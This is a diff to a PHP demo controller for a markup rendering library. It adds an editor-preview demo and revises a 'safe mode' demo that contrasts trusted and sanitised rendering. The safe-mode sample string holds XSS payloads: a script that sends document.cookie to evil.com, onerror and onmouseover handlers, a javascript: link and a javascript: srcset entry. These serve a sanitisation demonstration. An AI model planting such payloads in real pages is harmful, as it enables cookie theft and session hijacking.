@@ -131,27 +131,29 @@ class DemoController extends Controller
         ]);
     }
 
-    public function safeMode(CarveConverterInterface $carve, CarveManager $manager): View
+    public function safeMode(CarveManager $manager): View
     {
         $maliciousContent = <<<'CARVE'
         # User Post
 
         Normal content here.
 
+        ```=html
         <script>document.location='https://evil.com/?cookie='+document.cookie</script>
-
         <img src="x" onerror="alert('XSS')">
-
         <div onmouseover="alert('XSS')">Hover me</div>
+        ```
 
         [Click me](javascript:alert('XSS'))
+
+        ![unsafe candidates](safe.png){srcset="safe.png 1x, javascript:alert(1) 2x"}
 
         More normal content.
         CARVE;
 
         return view('demo.safe_mode', [
             'source' => $maliciousContent,
-            'unsafe_html' => $carve->toHtml($maliciousContent),
+            'unsafe_html' => $manager->toHtml($maliciousContent, 'trusted'),
             'safe_html' => $manager->toHtml($maliciousContent, 'user_content'),
         ]);
     }
@@ -592,6 +594,24 @@ class DemoController extends Controller
             'text' => $carve->toText($source),
             'markdown' => $carve->toMarkdown($source),
             'ansi' => $carve->toAnsi($source),
+        ]);
+    }
+
+    public function editorPreview(CarveManager $manager): View
+    {
+        $source = <<<'CARVE'
+        # Source-aware preview :spark:
+
+        Each rendered block carries its original 1-based line number, while
+        the configured symbol is replaced with trusted presentation HTML.
+
+        - Click a preview block
+        - Scroll the editor to its `data-source-line`
+        CARVE;
+
+        return view('demo.editor_preview', [
+            'source' => $source,
+            'html' => $manager->toHtml($source, 'editor_preview'),
         ]);
     }
 }
